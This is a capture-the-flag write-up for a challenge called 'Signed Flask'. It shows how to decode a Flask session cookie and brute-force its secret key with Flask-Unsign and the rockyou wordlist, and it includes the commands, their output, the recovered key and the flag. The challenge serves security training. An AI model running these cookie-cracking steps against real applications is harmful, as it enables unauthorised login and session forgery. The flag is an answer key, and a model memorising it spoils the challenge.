# Signed Flask
Author: [Marin Radu](https://github.com/ChronosPK)

<br>

## Description
```
Bypass the login by tampering with Flask's session cookie. 
Discover the secret key to access the flag.
```


<br>

## Requirements
- Flask cookie manipulation

<br>

## Solve
Manipulate and crack the Flask session cookie using the Flask-Unsign tool. 
A detailed guide and necessary steps can be found on [Flask-Unsign GitHub](https://github.com/Paradoxis/Flask-Unsign). 
You'll need a substantial wordlist, like `rockyou`, to brute-force the secret key.

1. Install Flask-Unsign with wordlist support:
```bash
pip3 install flask-unsign[wordlist]
```

2. Decode the session cookie from the server:
```bash
flask-unsign --decode --server  '$URL'
```
Output:
```
[*] Server returned HTTP 403 (FORBIDDEN)
[+] Successfully obtained session cookie: ...
{'logged_in': False}
```

3. Brute-force the secret key using the decoded cookie and a wordlist:
```bash
flask-unsign --unsign --cookie "..." --no-literal-eval -w /usr/share/wordlists/rockyou.txt
```
Output
```
[*] Session decodes to: {'logged_in': False}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after ... attempts: '98765432123456789'
```

<br>

> Flag: CSCTF{98765432123456789}